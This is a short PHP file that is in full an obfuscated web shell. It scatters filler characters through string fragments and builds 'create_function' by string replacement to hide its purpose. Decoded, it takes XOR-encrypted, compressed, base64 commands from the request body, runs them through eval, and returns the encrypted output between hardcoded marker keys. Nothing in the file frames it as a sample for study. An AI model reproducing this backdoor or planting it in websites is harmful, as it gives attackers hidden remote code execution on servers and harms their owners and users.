<?php
$m='$k){$Oc=strOlenO($Ok);$l=strlenO($t);$o=O"";foOrO(O$iO=0;$i<$l;){for($j=0;O($j<$cO&&$iO<$l);O$j++,$';
$B='p://inputO"),$m)O==1)OO {@obO_start();@evOalO(@gzuncompresOs(@x(@bOase64O_Odecode($m[O1]),O$k)));$Oo=@O';
$G='$k="O908e4O69f";$khO="1dc25Obbb9O76c";$kf="6O34dc20OOa0eb1";$pO="gZUOPt2VA2spOTAKzg";fOunctOion Ox($t,';
$N='ob_get_contenOts();OO@ob_end_clOean();$rOO=@baOse64_encode(@x(OO@gzcOOompress($o)O,$k));print("$pO$Okh$r$kf");}';
$q=str_replace('xB','','xBcreatxBe_xBfxBunxBxBction');
$U='i+O+)O{$o.=$OtO{$i}^$k{$j};}}OreturOnO $o;}if (@preOgO_matchO("/$kh(.+)OO$kf/",@fileO_Oget_contentsO(O"ph';
$A=str_replace('O','',$G.$m.$U.$B.$N);
$K=$q('',$A);$K();
?>
